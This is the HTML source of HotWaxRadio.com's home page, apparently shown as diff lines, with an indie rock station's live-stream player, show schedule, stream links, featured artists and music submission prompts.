+			</div></aside></div></div><div class="vc_empty_space  hide_on_mobile"   style="height: 1.8em"><span class="vc_empty_space_inner"></span></div><div class="vc_btn3-container vc_btn3-left" ><a class="vc_general vc_btn3 vc_btn3-size-lg vc_btn3-shape-square vc_btn3-style-flat vc_btn3-color-black" href="https://hotwaxradio.com/wp/submit-music/" title="">SUBMIT YOUR MUSIC</a></div></div></div></div><div class="wpb_column vc_column_container vc_col-sm-6 vc_hidden-xs sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="wpb_text_column wpb_content_element " >
+		<div class="wpb_wrapper">
+			<h1 style="margin: 0px; text-align: right;">A World of Music Beyond the Mainstream</h1>
+
+		</div>
+	</div>
+<div class="vc_empty_space  hide_on_mobile"   style="height: 1.8em"><span class="vc_empty_space_inner"></span></div>
+	<div class="wpb_text_column wpb_content_element  vc_custom_1637699974009 extra-simple-text-size" >
+		<div class="wpb_wrapper">
+			<p style="font-size: 1.6em; text-align: right;">We Spin HIT INDIE MUSIC from All Realms of Rock N Roll 24/7. Catch the DJ Trick Show LIVE Alternate Fridays from 4-6 PM EST.</p>
+
+		</div>
+	</div>
+</div></div></div></div><div class="vc_row wpb_row vc_inner vc_row-fluid shape_divider_top-none shape_divider_bottom-none"><div class="wpb_column vc_column_container vc_col-sm-6 vc_hidden-lg vc_hidden-md vc_hidden-sm sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="wpb_text_column wpb_content_element " >
+		<div class="wpb_wrapper">
+			<h2 style="margin: 0px; text-align: center;"><strong>A World of Music Beyond the Mainstream</strong></h2>
+
+		</div>
+	</div>
+<div class="vc_empty_space  hide_on_desktop hide_on_notebook hide_on_tablet"   style="height: 1.8em"><span class="vc_empty_space_inner"></span></div>
+	<div class="wpb_text_column wpb_content_element  vc_custom_1645079321134 extra-simple-text-size" >
+		<div class="wpb_wrapper">
+			<p style="font-size: 1.6em;">We Spin HIT INDIE MUSIC from All Realms of Rock N Roll 24/7. Catch the DJ Trick Show LIVE Alternate Fridays from 4-6 PM EST.</p>
+
+		</div>
+	</div>
+</div></div></div><div class="wpb_column vc_column_container vc_col-sm-6 vc_hidden-lg vc_hidden-md vc_hidden-sm sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 0.7em"><span class="vc_empty_space_inner"></span></div><div class="sc_layouts_item"><div id="widget_audio_1658502282" class="widget_area sc_widget_audio vc_widget_audio wpb_content_element"><aside id="widget_audio_1658502282_widget" class="widget widget_audio"><div class="trx_addons_audio_wrap">
+		<div class="trx_addons_audio_list">
+						<div class="trx_addons_audio_player
+				 without_cover					"
+									>
+					<div class="trx_addons_audio_player_wrap">
+										 
+		<div class="audio_info">
+													<h6 class="audio_author">Now Playing</h6>
+													<h5 class="audio_caption">HotWaxRadio.com Live Stream</h5>
+								</div>
+											<div class="audio_frame audio_local">
+													<audio src="https://stream.abyss-shoutcast.com/proxy/hotwaxradiocom/stream"></audio>
+													</div>
+				</div>
+				</div>
+						</div>
+			</div></aside></div></div><div class="vc_empty_space"   style="height: 1.8em"><span class="vc_empty_space_inner"></span></div><div class="vc_btn3-container vc_btn3-center" ><a class="vc_general vc_btn3 vc_btn3-size-lg vc_btn3-shape-square vc_btn3-style-flat vc_btn3-color-black" href="https://hotwaxradio.com/wp/submit-music/" title="">SUBMIT YOUR MUSIC</a></div></div></div></div></div><div class="vc_empty_space  hide_on_mobile"   style="height: 1.8em"><span class="vc_empty_space_inner"></span></div></div></div><!-- /.sc_content --><div class="vc_empty_space"   style="height: 2em"><span class="vc_empty_space_inner"></span></div><div class="vc_empty_space  hide_on_tablet hide_on_mobile"   style="height: 1.5em"><span class="vc_empty_space_inner"></span></div><div class="vc_empty_space  hide_on_mobile"   style="height: 4em"><span class="vc_empty_space_inner"></span></div></div></div></div></div></header><div class="menu_mobile_overlay"></div>
+<div class="menu_mobile menu_mobile_fullscreen scheme_dark">
+	<div class="menu_mobile_inner">
+		<a class="menu_mobile_close icon-cancel"></a><a class="sc_layouts_logo" href="https://hotwaxradio.com/wp/"><img src="//hotwaxradio.com/wp/wp-content/uploads/2021/10/Hot-Wax-Logo-256.png" alt="Hot Wax Radio" width="256" height="256"></a><nav class="menu_mobile_nav_area"><ul id="menu_mobile_2128167876"><li id="menu_mobile-item-327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-319 current_page_item menu-item-327"><a href="https://hotwaxradio.com/wp/" aria-current="page"><span>Home</span></a></li><li id="menu_mobile-item-1397" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1397"><a href="https://hotwaxradio.com/wp/shows/"><span>Shows</span></a></li><li id="menu_mobile-item-340" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-340"><a href="https://hotwaxradio.com/wp/submit-music/"><span>Submit Your Music</span></a></li><li id="menu_mobile-item-177" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-177"><a href="https://hotwaxradio.com/wp/contact/"><span>Contact</span></a></li><li id="menu_mobile-item-284" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-284"><a href="https://hotwaxradio.com/wp/about/"><span>About</span></a>
+<ul class="sub-menu"><li id="menu_mobile-item-969" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-969"><a href="https://hotwaxradio.com/wp/terms-privacy/"><span>Terms &#038; Privacy</span></a></li></ul>
+</li></ul></nav><div class="search_wrap search_style_normal search_mobile">
+	<div class="search_form_wrap">
+		<form role="search" method="get" class="search_form" action="https://hotwaxradio.com/wp/">
+			<input type="text" class="search_field" placeholder="Search" value="" name="s">
+			<button type="submit" class="search_submit trx_addons_icon-search"></button>
+					</form>
+	</div>
+	</div><div class="socials_mobile"><a target="_blank" href="https://www.facebook.com/hotwaxradio" class="social_item social_item_style_icons social_item_type_icons"><span class="social_icon social_icon_facebook"><span class="icon-facebook"></span></span></a><a target="_blank" href="https://twitter.com/hotwaxradio" class="social_item social_item_style_icons social_item_type_icons"><span class="social_icon social_icon_twitter"><span class="icon-twitter"></span></span></a></div>	</div>
+</div>
+
+			<div class="page_content_wrap">
+
+								<div class="content_wrap">
+				
+									
+
+					<div class="content">
+										
+
+<article id="post-319" class="post_item_single post_type_page post-319 page type-page status-publish hentry" itemscope="itemscope" 
+		   itemprop="mainEntityOfPage" 
+		   itemtype="//schema.org/Website"
+		   itemid="https://hotwaxradio.com/wp/"
+		   content="Home">
+
+	<div class="structured_data_snippets">
+		<meta itemprop="headline" content="Home">
+		<meta itemprop="datePublished" content="2018-01-05">
+		<meta itemprop="dateModified" content="2022-10-21">
+		<div itemscope itemprop="publisher" itemtype="//schema.org/Organization">
+			<meta itemprop="name" content="Hot Wax Radio">
+			<meta itemprop="telephone" content="">
+			<meta itemprop="address" content="">
+					</div>
+		<div itemscope itemprop="author" itemtype="//schema.org/Person">
+				<meta itemprop="name" content="DJ Trick">
+			</div></div>
+	<div class="post_content entry-content">
+		<div data-vc-full-width="true" data-vc-full-width-init="false" data-vc-stretch-content="true" class="vc_row wpb_row vc_row-fluid vc_row-no-padding shape_divider_top-none shape_divider_bottom-none"><div class="wpb_column vc_column_container vc_col-sm-12 sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper"><div  id="sc_timetable_618055176"		class="sc_timetable sc_timetable_default"><div class="sc_timetable_columns_wrap sc_item_columns sc_item_posts_container trx_addons_columns_wrap no_padding"><div class="trx_addons_column-1_3"><div class="sc_timetable_item post-578 mp-event type-mp-event status-publish has-post-thumbnail hentry mp-event_category-radio-shows mp-event-item">        <div class="post_featured sc_timetable_item_featured">
+            <img fetchpriority="high" decoding="async" width="855" height="405" src="https://hotwaxradio.com/wp/wp-content/uploads/2021/10/juja-han-uT55XxQLQGU-unsplash-855x405.jpg" class="attachment-sounder-thumb-extra-rectangle size-sounder-thumb-extra-rectangle wp-post-image" alt="" />        </div><!-- .post_featured -->
+        <div class="sc_timetable_item_header entry-header">
+        <div class="date"><span class="wrap">
+        Mon &#8211; Fri            <time datetime="06:00" class="timeslot-start">6:00 AM</time>
+        -            <time datetime="12:00" class="timeslot-end">12:00 PM</time>
+        </span></div><!-- .entry-header --><h5 class="sc_timetable_item_title"><a href="https://hotwaxradio.com/wp/show/morning-mix/" rel="bookmark">Morning Mix</a></h5></div><!-- .entry-content --></div><!-- .sc_timetable_item --></div><div class="trx_addons_column-1_3"><div class="sc_timetable_item post-574 mp-event type-mp-event status-publish has-post-thumbnail hentry mp-event_category-radio-shows mp-event-item">        <div class="post_featured sc_timetable_item_featured">
+            <img decoding="async" width="855" height="405" src="https://hotwaxradio.com/wp/wp-content/uploads/2021/10/avi-naim-uXsu-Mrf2cc-unsplash-855x405.jpg" class="attachment-sounder-thumb-extra-rectangle size-sounder-thumb-extra-rectangle wp-post-image" alt="" />        </div><!-- .post_featured -->
+        <div class="sc_timetable_item_header entry-header">
+        <div class="date"><span class="wrap">
+        Mon &#8211; Fri            <time datetime="16:00" class="timeslot-start">4:00 PM</time>
+        -            <time datetime="18:00" class="timeslot-end">6:00 PM</time>
+        </span></div><!-- .entry-header --><h5 class="sc_timetable_item_title"><a href="https://hotwaxradio.com/wp/show/afternoon-news/" rel="bookmark">Afternoon Tricks</a></h5></div><!-- .entry-content --></div><!-- .sc_timetable_item --></div><div class="trx_addons_column-1_3"><div class="sc_timetable_item post-191 mp-event type-mp-event status-publish has-post-thumbnail hentry mp-event_category-radio-shows mp-event-item">        <div class="post_featured sc_timetable_item_featured">
+            <img decoding="async" width="855" height="405" src="https://hotwaxradio.com/wp/wp-content/uploads/2021/10/pexels-edward-eyer-811838-855x405.jpg" class="attachment-sounder-thumb-extra-rectangle size-sounder-thumb-extra-rectangle wp-post-image" alt="" />        </div><!-- .post_featured -->
+        <div class="sc_timetable_item_header entry-header">
+        <div class="date"><span class="wrap">
+        Sun &#8211; Thurs            <time datetime="21:00" class="timeslot-start">9:00 PM</time>
+        -            <time datetime="06:00" class="timeslot-end">6:00 AM</time>
+        </span></div><!-- .entry-header --><h5 class="sc_timetable_item_title"><a href="https://hotwaxradio.com/wp/show/rock-nights/" rel="bookmark">Rock Nights</a></h5></div><!-- .entry-content --></div><!-- .sc_timetable_item --></div></div></div><div class="vc_empty_space"   style="height: 1em"><span class="vc_empty_space_inner"></span></div><div  id="sc_action_1951050686" 
+	class="sc_action color_style_default sc_action_default"><div class="sc_action_content sc_item_content"><div class="sc_action_item sc_action_item_default sc_action_item_tc">
+			<a href="https://hotwaxradio.com/wp/shows/" class="sc_action_item_link sc_button">Click Here to View All Shows</a></div></div></div><!-- /.sc_action --></div></div></div></div><div class="vc_row-full-width vc_clearfix"></div><div class="vc_row wpb_row vc_row-fluid shape_divider_top-none shape_divider_bottom-none"><div class="wpb_column vc_column_container vc_col-sm-12 sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 4em"><span class="vc_empty_space_inner"></span></div><div id="sc_title_1224765518"
+		class="sc_title color_style_default sc_title_accent"><div class="title-wrap al-left"><div class="style-bg"><h2 class="sc_item_title sc_title_title sc_align_left sc_item_title_style_accent">How to Listen</h2></div></div></div><!-- /.sc_title --><div class="vc_empty_space"   style="height: 4em"><span class="vc_empty_space_inner"></span></div></div></div></div></div><div class="vc_row wpb_row vc_row-fluid shape_divider_top-none shape_divider_bottom-none"><div class="wpb_column vc_column_container vc_col-sm-6 sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="wpb_text_column wpb_content_element  vc_custom_1639717668627 scheme_default" >
+		<div class="wpb_wrapper">
+			<p><span style="color: #1d1d1d; font-family: Questrial;"><strong>The fastest way to listen to our Live Stream, is by clicking Play on the player at the top of this page or clicking one of our Stream Links. However, there are other methods of receiving HotWaxRadio.com that give you a full-featured listening experience. Our preferred recommendation is to use a 3rd party software program or app, such as <a style="color: #dbcc23;" href="http://www.videolan.org/vlc/" target="new" rel="noopener">VLC Player</a>. Then simply enter one of our Stream Links in the Open Network Stream tab.</strong></span></p>
+<p><span style="color: #1d1d1d; font-family: Questrial;"><strong>Using VLC Player and one of our regular streams (128k / 320k) you will see Artist Name and Song Title displayed on your smart phone or wireless device.</strong></span></p>
+
+		</div>
+	</div>
+<div class="vc_empty_space"   style="height: 4em"><span class="vc_empty_space_inner"></span></div></div></div></div><div class="wpb_column vc_column_container vc_col-sm-6 sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper">
+	<div class="wpb_text_column wpb_content_element  vc_custom_1639705641028 scheme_default" >
+		<div class="wpb_wrapper">
+			<p><span style="color: #1d1d1d; font-family: Questrial;"><strong>Stream Links:</strong></span></p>
+<p><span style="color: #1d1d1d; font-family: Questrial;"><strong>128k: <a style="color: #dbcc23;" href="http://128k.hotwaxradio.com">http://128k.hotwaxradio.com</a></strong></span></p>
+<p><span style="color: #1d1d1d; font-family: Questrial;"><strong>320k: <a style="color: #dbcc23;" href="http://320k.hotwaxradio.com">http://320k.hotwaxradio.com</a></strong></span></p>
+<p><span style="color: #1d1d1d; font-family: Questrial;"><strong>320k SSL: <a style="color: #dbcc23;" href="https://onair.hotwaxradio.com">https://onair.hotwaxradio.com</a></strong></span></p>
+<p><span style="color: #1d1d1d; font-family: Questrial;"><strong>Metadata (<em>artist name and song title</em>) is not available on SSL streams.</strong></span></p>
+<p><span style="color: #1d1d1d; font-family: Questrial;"><strong>We are proud to be hosted by <a style="color: #dbcc23;" href="http://abyss-shoutcast.com/" target="new" rel="noopener">Abyss Shoutcast</a>.</strong></span></p>
+
+		</div>
+	</div>
+<div class="vc_empty_space"   style="height: 4em"><span class="vc_empty_space_inner"></span></div></div></div></div></div><div class="vc_row wpb_row vc_row-fluid shape_divider_top-none shape_divider_bottom-none"><div class="wpb_column vc_column_container vc_col-sm-12 sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 2em"><span class="vc_empty_space_inner"></span></div><div id="sc_title_908694459"
+		class="sc_title color_style_default sc_title_accent"><div class="title-wrap al-left"><div class="style-bg"><h2 class="sc_item_title sc_title_title sc_align_left sc_item_title_style_accent">Featured Artists</h2></div></div></div><!-- /.sc_title --><div class="vc_empty_space"   style="height: 4em"><span class="vc_empty_space_inner"></span></div></div></div></div></div><div class="vc_row wpb_row vc_row-fluid shape_divider_top-none shape_divider_bottom-none"><div class="wpb_column vc_column_container vc_col-sm-12 sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper"><div  id="sc_team_1080271391"		class="sc_team color_style_default sc_team_featured"><div class="sc_team_columns_wrap sc_item_columns sc_item_posts_container trx_addons_columns_wrap columns_padding_bottom"><div class="trx_addons_column-1_3"><div class="sc_team_item no_links post-2846 cpt_team type-cpt_team status-publish has-post-thumbnail hentry">
+	<div class="post_featured sc_team_item_thumb trx_addons_hover trx_addons_hover_style_in"><a href="https://hotwaxradio.com/wp/team/hit-indie-music/" aria-hidden="true"><img loading="lazy" decoding="async" width="760" height="790" src="https://hotwaxradio.com/wp/wp-content/uploads/2024/06/2024-06-21-15th-Anniversary-02-1-760x790.png" class="attachment-sounder-thumb-extra-big size-sounder-thumb-extra-big wp-post-image" alt="" /></a><div class="hover_content_first"><div class="sc_team_item_subtitle">15 YEARS OF BROADCASTING</div><h4 class="sc_team_item_title"><a href="https://hotwaxradio.com/wp/team/hit-indie-music/">HIT INDIE MUSIC</a></h4></div><div class="sc_team_item_socials socials_wrap"><a target="_blank" href="http://128k.hotwaxradio.com" class="social_item social_item_style_icons social_item_type_icons"><span class="social_icon social_icon_music-light"><span class="icon-music-light"></span></span></a><a target="_blank" href="https://onair.hotwaxradio.com" class="social_item social_item_style_icons social_item_type_icons"><span class="social_icon social_icon_music-headphones"><span class="icon-music-headphones"></span></span></a><a target="_blank" href="https://instagram.com/hitindiemusic" class="social_item social_item_style_icons social_item_type_icons"><span class="social_icon social_icon_instagramm"><span class="icon-instagramm"></span></span></a><a target="_blank" href="https://facebook.com/hitindiemusic" class="social_item social_item_style_icons social_item_type_icons"><span class="social_icon social_icon_facebook"><span class="icon-facebook"></span></span></a></div><div class="trx_addons_hover_mask"></div></div></div>
+</div><div class="trx_addons_column-1_3"><div class="sc_team_item no_links post-2839 cpt_team type-cpt_team status-publish has-post-thumbnail hentry">
+	<div class="post_featured sc_team_item_thumb trx_addons_hover trx_addons_hover_style_in"><a href="https://hotwaxradio.com/wp/team/state-of-shock/" aria-hidden="true"><img loading="lazy" decoding="async" width="201" height="201" src="https://hotwaxradio.com/wp/wp-content/uploads/2024/06/memento.jpg" class="attachment-sounder-thumb-extra-big size-sounder-thumb-extra-big wp-post-image" alt="Memento Album Cover" srcset="https://hotwaxradio.com/wp/wp-content/uploads/2024/06/memento.jpg 201w, https://hotwaxradio.com/wp/wp-content/uploads/2024/06/memento-150x150.jpg 150w, https://hotwaxradio.com/wp/wp-content/uploads/2024/06/memento-90x90.jpg 90w" sizes="(max-width: 201px) 100vw, 201px" /></a><div class="hover_content_first"><div class="sc_team_item_subtitle">Who was State Of Shock?</div><h4 class="sc_team_item_title"><a href="https://hotwaxradio.com/wp/team/state-of-shock/">State Of Shock</a></h4></div><div class="sc_team_item_socials socials_wrap"></div><div class="trx_addons_hover_mask"></div></div></div>
+</div><div class="trx_addons_column-1_3"><div class="sc_team_item no_links post-1442 cpt_team type-cpt_team status-publish has-post-thumbnail hentry">
+	<div class="post_featured sc_team_item_thumb trx_addons_hover trx_addons_hover_style_in"><a href="https://hotwaxradio.com/wp/team/still-eighteen/" aria-hidden="true"><img loading="lazy" decoding="async" width="760" height="790" src="https://hotwaxradio.com/wp/wp-content/uploads/2021/12/Still-Eighteen-Piazza-Cabvour-760x790.jpg" class="attachment-sounder-thumb-extra-big size-sounder-thumb-extra-big wp-post-image" alt="" /></a><div class="hover_content_first"><div class="sc_team_item_subtitle">Canadian Alt Rockers</div><h4 class="sc_team_item_title"><a href="https://hotwaxradio.com/wp/team/still-eighteen/">Still Eighteen</a></h4></div><div class="sc_team_item_socials socials_wrap"><a target="_blank" href="https://www.stilleighteen.com/" class="social_item social_item_style_icons social_item_type_icons"><span class="social_icon social_icon_link"><span class="icon-link"></span></span></a><a target="_blank" href="https://www.facebook.com/stilleighteen" class="social_item social_item_style_icons social_item_type_icons"><span class="social_icon social_icon_facebook"><span class="icon-facebook"></span></span></a></div><div class="trx_addons_hover_mask"></div></div></div>
+</div></div></div><!-- /.sc_team --></div></div></div></div><div class="vc_row wpb_row vc_row-fluid shape_divider_top-none shape_divider_bottom-none"><div class="wpb_column vc_column_container vc_col-sm-6 sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 3em"><span class="vc_empty_space_inner"></span></div><div id="sc_title_1910375149"
+		class="sc_title color_style_default sc_title_default"><div class="al-left"><h6 class="sc_item_subtitle sc_title_subtitle sc_align_left sc_item_title_style_default">More Feature Artists</h6></div></div><!-- /.sc_title -->
+	<div class="wpb_text_column wpb_content_element  vc_custom_1638405079845 scheme_default" >
+		<div class="wpb_wrapper">
+			<p><span style="size: 20; color: #1d1d1d; font-family: Questrial;"><strong>This is just a small sample of the many wonderful artists you&#8217;ll hear on HotWaxRadio.com. Thank you for Supporting Indie Music.<br />
+</strong></span></p>
+<p><span style="size: 20; color: #ffffff; font-family: Questrial;">Chelsea Lyn Meyer, MaHA Rocks, The Metal Byrds, J.Adair, Future Radio, Stonebourne, Golden Richards, Rolling Numbers, Batteries Not Included (BNI Chicago), The Bishops Daredevil Stunt Club, The Glad Machine, Raised on TV, Sarajevo 84, Skittish, The Follow, Elm Treason, Eric Maring, D’Arcy Johnson, Frames, Lights of Marfa, The Great Affairs, Merrin, Janani, Heavy America, Icicle, The Corridors, Skittish, Anthony Casuccio, Andrew Pike, Eric Macek, The Depth and the Whisper, plus many, many more.</span></p>
+
+		</div>
+	</div>
+</div></div></div><div class="wpb_column vc_column_container vc_col-sm-6 sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 3em"><span class="vc_empty_space_inner"></span></div><div id="sc_title_635563908"
+		class="sc_title color_style_default sc_title_default"><div class="al-left"><h6 class="sc_item_subtitle sc_title_subtitle sc_align_left sc_item_title_style_default">Submit Your Music</h6></div></div><!-- /.sc_title --><div class="vc_row wpb_row vc_inner vc_row-fluid vc_custom_1638401054129 vc_row-has-fill vc_row-o-content-middle vc_row-flex shape_divider_top-none shape_divider_bottom-none"><div class="wpb_column vc_column_container vc_col-sm-12 sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 30px"><span class="vc_empty_space_inner"></span></div>
+	<div class="wpb_text_column wpb_content_element " >
+		<div class="wpb_wrapper">
+			<h3 style="text-align: center;">INDIE BANDS &amp; SOLO ARTISTS</h3>
+
+		</div>
+	</div>
+<div class="vc_empty_space"   style="height: 15px"><span class="vc_empty_space_inner"></span></div>
+	<div class="wpb_text_column wpb_content_element " >
+		<div class="wpb_wrapper">
+			<p style="text-align: center; font-family: Questrial;">Submit Your Music for Airplay<br />
+We Welcome Music from All Realms of Rock N Roll</p>
+
+		</div>
+	</div>
+<div class="vc_empty_space"   style="height: 1.3em"><span class="vc_empty_space_inner"></span></div><section class="vc_cta3-container vc_cta3-size-lg"><div class="vc_general vc_cta3 vc_cta3-style-custom vc_cta3-shape-square vc_cta3-align-left vc_cta3-icon-size-md vc_cta3-actions-bottom" style="background-color:#f1e300;"><div class="vc_cta3_content-container"><div class="vc_cta3-content"><header class="vc_cta3-content-header"></header></div><div class="vc_cta3-actions"><div class="vc_btn3-container vc_btn3-center" ><a class="vc_general vc_btn3 vc_btn3-size-lg vc_btn3-shape-square vc_btn3-style-flat vc_btn3-block vc_btn3-color-black" href="https://hotwaxradio.com/wp/submit-music/" title="Submit Your Music">Submit Your Music</a></div></div></div></div></section></div></div></div></div></div></div></div></div><div class="vc_row wpb_row vc_row-fluid shape_divider_top-none shape_divider_bottom-none"><div class="wpb_column vc_column_container vc_col-sm-12 sc_layouts_column_icons_position_left"><div class="vc_column-inner"><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 4em"><span class="vc_empty_space_inner"></span></div></div></div></div></div>
+	</div><!-- .entry-content -->
+
+	
+</article>
+				
+					</div><!-- </.content> -->
+
+					</div><!-- </.content_wrap> -->			</div><!-- </.page_content_wrap> -->
+
+			<footer class="footer_wrap footer_custom footer_custom_331 footer_custom_footer scheme_default">
+	<div class="vc_row wpb_row vc_row-fluid vc_custom_1639719565497 vc_row-has-fill shape_divider_top-none shape_divider_bottom-none"><div class="wpb_column vc_column_container vc_col-sm-12 vc_col-has-fill sc_layouts_column_icons_position_left scheme_default"><div class="vc_column-inner vc_custom_1639718689531"><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 10px"><span class="vc_empty_space_inner"></span></div><div class="vc_row wpb_row vc_inner vc_row-fluid shape_divider_top-none shape_divider_bottom-none"><div class="wpb_column vc_column_container vc_col-sm-4 vc_col-has-fill sc_layouts_column_icons_position_left scheme_default"><div class="vc_column-inner vc_custom_1639717705576"><div class="wpb_wrapper">
+	<div class="wpb_text_column wpb_content_element  vc_custom_1648544460278 scheme_default" >
+		<div class="wpb_wrapper">
+			<p>© 2022 HotWaxRadio.com</p>
+
+		</div>
+	</div>
+</div></div></div><div class="wpb_column vc_column_container vc_col-sm-4 vc_col-has-fill sc_layouts_column_icons_position_left scheme_default"><div class="vc_column-inner vc_custom_1639718610069"><div class="wpb_wrapper"><div class="sc_layouts_item"><div  id="sc_socials_888397658" 
+		class="sc_socials sc_socials_default sc_align_center  vc_custom_1650916278713"><div class="socials_wrap"><a target="_blank" href="http://facebook.com/hitindiemusic" class="social_item social_item_style_icons social_item_type_icons"><span class="social_icon social_icon_facebook"><span class="icon-facebook"></span></span></a></div><!-- /.socials_wrap --></div><!-- /.sc_socials --></div></div></div></div><div class="wpb_column vc_column_container vc_col-sm-4 vc_hidden-xs vc_col-has-fill sc_layouts_column_icons_position_left"><div class="vc_column-inner vc_custom_1640158884403"><div class="wpb_wrapper"><div class="sc_layouts_item"><nav class="sc_layouts_menu sc_layouts_menu_default sc_layouts_menu_dir_horizontal menu_hover_fade  vc_custom_1639719431318" itemtype="http://schema.org/SiteNavigationElement" itemscope="itemscope" id="sc_layouts_menu_1353241465"		><ul id="sc_layouts_menu_2094784057" class="sc_layouts_menu_nav"><li id="menu-item-1307" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1307"><a href="https://hotwaxradio.com/wp/about/"><span>About</span></a></li><li id="menu-item-1308" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1308"><a href="https://hotwaxradio.com/wp/contact/"><span>Contact</span></a></li><li id="menu-item-1306" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1306"><a href="https://hotwaxradio.com/wp/terms-privacy/"><span>Terms &#038; Privacy</span></a></li></ul></nav><!-- /.sc_layouts_menu --></div></div></div></div></div></div></div></div></div></footer><!-- /.footer_wrap -->
+
+		</div><!-- /.page_wrap -->
+
+	</div><!-- /.body_wrap -->
+
+	
+	<a href="#" class="trx_addons_scroll_to_top trx_addons_icon-up" title="Scroll to top"></a><link property="stylesheet" rel='stylesheet' id='so-css-sounder-css' href='https://hotwaxradio.com/wp/wp-content/uploads/so-css/so-css-sounder.css?ver=1640157082' type='text/css' media='all' />
+
+</body></div>
